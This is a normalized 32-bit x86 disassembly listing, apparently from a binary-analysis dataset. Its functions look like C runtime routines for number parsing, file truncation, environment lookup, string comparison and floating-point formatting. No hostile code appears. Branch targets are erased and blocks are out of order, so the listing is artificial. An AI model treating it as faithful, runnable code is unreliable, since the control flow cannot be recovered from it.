inc ecx
inc ecx
inc edx
inc edx
jmp r-xdata
dec [ ebp + 0x10 ]
je r-xdata
sub_1003cc3e
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_1002a8c8
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_1002d4db
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_100345ed
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
mov eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_1002d4db
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_1003ce6d
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_1003cc3e
add esp 0x14
pop ebp
retn
sub_1003ceb7
mov eax [ rw-data ]
push esi
mov esi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_1003cee4
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_100389d2
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_1002d4db
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_100389d2
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_100389d2
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100389d2
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_1003d09a
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_1002d4db
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_10039ff1
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_1002d4db
mov [ eax ] 0xd
call sub_1002d4ee
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_1002d4ee
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_1002d4db
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_10031f79
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_1003d09a
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
ja r-xdata
sub_1003d09a
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov eax [ edx ]
and esi 0x1f
shl esi 0x6
lea ecx [ eax + esi ]
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_1003d156
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_1002d4db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_1003d18f
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
mov esi [ rw-data ]
jne r-xdata
push edi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop esi
pop ebp
retn
xor eax eax
push [ ebp + 0x8 ]
call sub_10027160
pop ecx
mov edi eax
jmp r-xdata
call sub_1003e36d
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push eax
call sub_10027160
pop ecx
cmp eax edi
jbe r-xdata
add esi 0x4
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
push edi
push [ ebp + 0x8 ]
push eax
call sub_1003e353
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
sub_1003d220
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_1003d281
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edx [ ebp - 0x8 ]
mov ecx edx
mov eax 0x8000
and ecx eax
and edx 0x7fff
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x30 ] 0xcc
mov [ ebp - 0x2f ] 0xcc
mov [ ebp - 0x2e ] 0xcc
mov [ ebp - 0x2d ] 0xcc
mov [ ebp - 0x2c ] 0xcc
mov [ ebp - 0x2b ] 0xcc
mov [ ebp - 0x2a ] 0xcc
mov [ ebp - 0x29 ] 0xcc
mov [ ebp - 0x28 ] 0xcc
mov [ ebp - 0x27 ] 0xcc
mov [ ebp - 0x26 ] 0xfb
mov [ ebp - 0x25 ] 0x3f
mov [ ebp - 0x74 ] 0x1
mov [ ebp - 0x70 ] ecx
test cx cx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
mov eax 0x7fff
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
shr ebx 0x8
mov eax esi
shr eax 0x18
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
movsx ebx ax
mov [ ebp - 0x20 ] cx
mov ecx rw-data
neg ebx
sub ecx 0x60
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x64 ] ecx
test ebx ebx
je r-xdata
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp esi eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
jge r-xdata
test esi 0x40000000
jne r-xdata
test edi edi
je r-xdata
xor edx edx
cmp cx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx ] dx
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
mov [ ebx + 0x5 ] dl
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x60 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
movzx ecx cx
mov ebx edx
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
mov edi eax
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx di
jae r-xdata
test ebx ebx
je r-xdata
mov eax rw-data
neg ebx
sub eax 0x60
mov [ ebp - 0x64 ] eax
test cx cx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x64 ] 0x54
mov ecx ebx
and ecx 0x7
sar ebx 0x3
test ecx ecx
je r-xdata
cmp esi eax
jne r-xdata
cmp esi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_1002e87c
add esp 0xc
xor esi esi
test eax eax
je r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x70 ] ax
mov [ edx + 0x3 ] 0x1
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x4 ] 0x30
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x64 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebx + 0x3 ] 0x6
push esi
push esi
push esi
push esi
push esi
call sub_100276d9
add esp 0x14
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jge r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
movzx edx [ eax + 0xa ]
xor ecx ecx
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x16 ]
mov esi edx
xor esi ecx
and esi 0x8000
mov [ ebp - 0x48 ] esi
mov esi 0x7fff
and ecx esi
and edx esi
lea esi [ edx + ecx ]
movzx edi si
mov esi 0x7fff
cmp cx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x48 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp dx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100276d9
add esp 0x14
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_1002e87c
add esp 0xc
xor esi esi
test eax eax
je r-xdata
dec ebx
mov al [ ebx ]
dec ebx
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x58 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
inc edi
inc edi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x48 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp cx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x54 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp dx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x70 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jge r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x48 ] 0x2
inc eax
inc eax
dec [ ebp - 0x54 ]
cmp [ ebp - 0x54 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x58 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x48 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
inc esi
inc esi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x68 ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x58 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x6c ] 0x2
sub [ ebp - 0x68 ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x6c ]
movzx ecx [ eax ]
mov eax [ ebp - 0x68 ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x54 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x54 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x48 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x48 ] ax
